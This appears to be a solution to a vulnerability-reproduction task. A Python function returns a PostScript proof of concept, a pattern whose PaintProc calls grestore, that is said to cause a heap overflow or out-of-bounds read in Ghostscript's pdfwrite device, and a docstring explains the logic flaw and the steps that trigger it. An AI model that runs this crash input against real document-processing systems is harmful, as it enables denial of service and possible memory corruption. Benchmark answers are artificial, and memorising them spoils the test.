class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a PoC that triggers a heap buffer overflow in pdfwrite.

        The vulnerability exists in the `gdev_pdf_close_figure` function, which
        is called by path painting operators like `fill` or `stroke`. This function
        is supposed to restore the viewer state that was saved by a corresponding
        `gdev_pdf_begin_figure` call. However, it fails to check if the viewer
        state stack is non-empty before attempting the restore operation.

        This PoC exploits this logic flaw using a PostScript pattern. The
        pattern's `PaintProc` (a procedure that draws the pattern tile) is
        crafted to contain a `grestore` command.

        The execution flow that triggers the crash is as follows:
        1. A path is defined and the `fill` operator is called.
        2. The `pdf_fill` device procedure is invoked. It first calls
           `gdev_pdf_begin_figure`, which saves the current viewer state,
           incrementing an internal depth counter.
        3. To fill the path, the color must be handled. The PoC sets the color
           to a custom pattern. The interpreter executes the pattern's `PaintProc`.
        4. The `grestore` command inside the `PaintProc` executes, prematurely
           restoring the viewer state and decrementing the depth counter.
        5. After the `PaintProc` finishes, control returns to `pdf_fill`, which
           proceeds to its final step: calling `gdev_pdf_close_figure`.
        6. `gdev_pdf_close_figure` unconditionally attempts to restore the viewer
           state again. Since the state was already restored, the depth counter
           is zero. This leads to a stack underflow on the viewer state stack,
           resulting in a read from a out-of-bounds memory location and a crash.
        """
        poc_content = b"""%!PS
<<
    /PatternType 1
    /PaintType 1
    /TilingType 1
    /BBox [0 0 10 10]
    /XStep 10
    /YStep 10
    /PaintProc { grestore }
>> matrix makepattern

/Pattern setcolorspace
setcolor

newpath
    100 100 moveto
    200 100 lineto
    150 200 lineto
closepath
fill

showpage
"""
        return poc_content
